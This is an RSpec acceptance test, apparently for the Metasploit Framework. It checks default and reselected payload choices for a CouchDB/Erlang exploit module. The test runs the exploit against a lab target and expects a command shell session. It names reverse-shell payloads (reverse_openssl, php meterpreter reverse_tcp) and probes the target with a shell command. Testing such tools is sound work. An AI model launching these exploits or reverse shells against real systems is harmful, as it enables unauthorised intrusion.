require 'acceptance_spec_helper'
require_relative '../../../test/module_targets/couchdb_erlang_sessions/acceptance'

RSpec.describe 'CouchDB initial defaults and explicit target selection', order: :defined do
  include_context 'module target'
  include_context 'wait_for_expect'
  include Acceptance::CouchdbErlangSessions

  before(:all) { cs_boot }

  it 'uses the untouched initial OpenSSL default twice after a native control' do
    cs_native('cmd/unix/reverse_openssl')
    @cs[:initial_defaults] = []
    2.times do |index|
      console_command('back')
      console_command('use ' + Acceptance::CouchdbErlangSessions::OWNER)
      selected = default_selection
      @cs[:initial_defaults] << selected
      expect(selected.values_at('target', 'payload')).to eq([0, 'cmd/unix/reverse_openssl'])
      output = run_target_module(Acceptance::CouchdbErlangSessions::OWNER, 'target', {
        'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 3
      }, action: 'run -z', reuse_module: true, command_timeout: 120)
      expect(output).to match(/Command shell session \d+ opened/)
      cs_use('cmd/unix/reverse_openssl', Acceptance::CouchdbErlangSessions::OWNER, 'initial-default-' + index.to_s)
      wait_for_expect(100, 0.1) { expect(cs_tmp).to eq(@cs.fetch(:baseline_tmp)) }
    end
  ensure
    console_command('sessions -K')
    console_command('jobs -K')
    cs_save
  end

  it 'separates explicit same-target reselection from initial defaults' do
    console_command('back')
    console_command('use ' + Acceptance::CouchdbErlangSessions::OWNER)
    before = default_selection
    output = console_command('set TARGET 0')
    after = default_selection
    @cs[:same_target_selection] = { before: before, output: output, after: after }
    @cs[:php_prerequisite] = target_exec('target', 'sh', '-c', 'if command -v php; then :; else printf ABSENT; fi')
    expect(before.values_at('target', 'payload')).to eq([0, 'cmd/unix/reverse_openssl'])
    expect(after.values_at('target', 'payload')).to eq([0, 'cmd/unix/php/meterpreter/reverse_tcp'])
    expect(output).to include('Switching from cmd/unix/reverse_openssl to cmd/unix/php/meterpreter/reverse_tcp')
    expect(@cs.fetch(:php_prerequisite)).to eq('ABSENT')
  ensure
    cs_save
  end

  after(:all) { cs_finish if @cs }

  def default_selection
    cs_json("{target:active_module.target_index,payload:active_module.datastore['PAYLOAD'],default:active_module.datastore.search_for('PAYLOAD').default?,source:active_module.method(:connect_to_erlang_server).source_location}")
  end
end
